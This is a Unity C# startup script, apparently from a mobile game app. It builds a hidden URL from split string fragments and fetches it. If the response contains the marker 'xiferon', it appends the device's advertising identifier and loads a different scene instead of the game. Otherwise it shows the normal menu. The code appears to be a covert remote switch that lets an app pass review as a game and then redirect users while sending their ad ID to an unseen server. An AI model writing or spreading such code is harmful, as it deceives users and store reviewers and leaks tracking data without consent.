using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class PxerLoadComnponernt : MonoBehaviour
{
    public List<string> pixerStringsParts;
    private string _pixerTempString, _pixerIdfaString = "";
    void Awake()
    {
        if (PlayerPrefs.GetInt("pixerIdfaSaveKey", 0) == 1)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string adString, bool trackEnabler, string error) =>
            { _pixerIdfaString = adString; });
        }
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("pixeringData", string.Empty) != string.Empty)
            {
                LaunchPixerLoading(PlayerPrefs.GetString("pixeringData"));
            }
            else
            {
                _pixerTempString = "";
                foreach (var px in pixerStringsParts)
                {
                    _pixerTempString += px;
                }
                StartCoroutine(PixerLoad(_pixerTempString));
            }
        }
        else
        {
            loadPixerGame();
        }
    }

    public void loadPixerGame()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("MenuScene");
    }

    private IEnumerator PixerLoad(string pixerString)
    {
        using (UnityWebRequest pixerStatus = UnityWebRequest.Get(pixerString))
        {
            pixerStatus.timeout = 4;
            yield return pixerStatus.SendWebRequest();
            if (pixerStatus.isNetworkError)
            {
                loadPixerGame();
            }
            else
            {
                try
                {
                    if (pixerStatus.result == UnityWebRequest.Result.Success)
                    {
                        if (pixerStatus.downloadHandler.text.Contains("xiferon"))
                        {
                            LaunchPixerLoading(string.Format("{0}?idfa={1}", pixerStatus.downloadHandler.text, _pixerIdfaString));
                        }
                        else
                        {
                            loadPixerGame();
                        }
                    }
                    else
                    {
                        loadPixerGame();
                    }
                }
                catch
                {
                    loadPixerGame();
                }
            }
        }
    }

    private void LaunchPixerLoading(string pixerTxt)
    {
        FindObjectOfType<PixerMoving>().PixersavbingKEy = pixerTxt;
        SceneManager.LoadScene("GameTestScene");
    }
}
